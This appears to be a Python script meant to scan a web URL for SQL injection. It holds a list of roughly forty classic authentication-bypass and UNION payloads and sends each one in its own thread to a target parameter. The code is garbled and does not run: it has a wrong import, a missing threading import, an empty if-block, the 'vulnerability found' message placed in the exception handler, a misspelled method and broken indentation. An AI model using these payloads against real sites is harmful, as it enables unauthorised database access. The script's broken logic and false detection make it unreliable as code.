import request 

# List of payloads to test for SQL injection
payloads = [
    "'-",
    "' ",
    "'&",
    "'^",
    "'*",
    "' or ''-",
    "' or '' ",
    "' or ''&",
    "' or ''^",
    "' or ''*",
    "\"-",
    "\" ",
    "\"&",
    "\"^",
    "\"*",
    "\" or \"-",
    "\" or \" ",
    "\" or \"&",
    "\" or \"^",
    "\" or \"*",
    "or true--",
    "\" or true--",
    "' or true--",
    "') or ('x')=('x",
    '") or ("x")=("x',
    "or 1=1",
    "or 1=1--",
    "or 1=1#",
    "admin' --",
    "admin' #",
    "admin' or '1'='1",
    "admin' or 1=1",
    "1234' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",
    "' and 1='1",
    "' and a='a",
    "' or 'x'='x",
    "or 0=0 --",
    "' or '1'='1",
    "' or 1=1--",
    "admin' or '1'='1'--",
    "' or 1=1 LIMIT 1;#"
]

def test_payload(url, param, value, payload):
    try:
        # Construct modified parameters
        modified_params = {**params, param :payload}
        print(f"Trying payload '{payload}' with parameter '{param}'")
        response = requests.get(url, params=modified_params)
        # Check for SQL injection vulnerability by looking for anomalies in the response
        if "error" in response.text.lower():  # Example heuristic to check for vulnerabilities
    except Exception as e:    
        print(f"[+] SQL Injection vulnerability found on {url} with payload '{payload}'")
    
def scan_sql_injection(url, params):
        threads = []

        for param, value in params.itmes():
            for payload in payloads:
            # Create a thread for each payload   
            thread = threading.Thread(target=test_payload, args=(url, param, value, payload))
            threads.append(thread)
            thread.start()
        
        # Wait for all threads to complete
        for thread in threads
        thread.join()

# Example usage
if __name__ == "__main__":
    url = 'YOUR_VULNERABLE_URL' # Replace with your target URl
    params = {'q': 'test'}      # Replace with your actual parameters

    scan_sql_injection(url, params)
    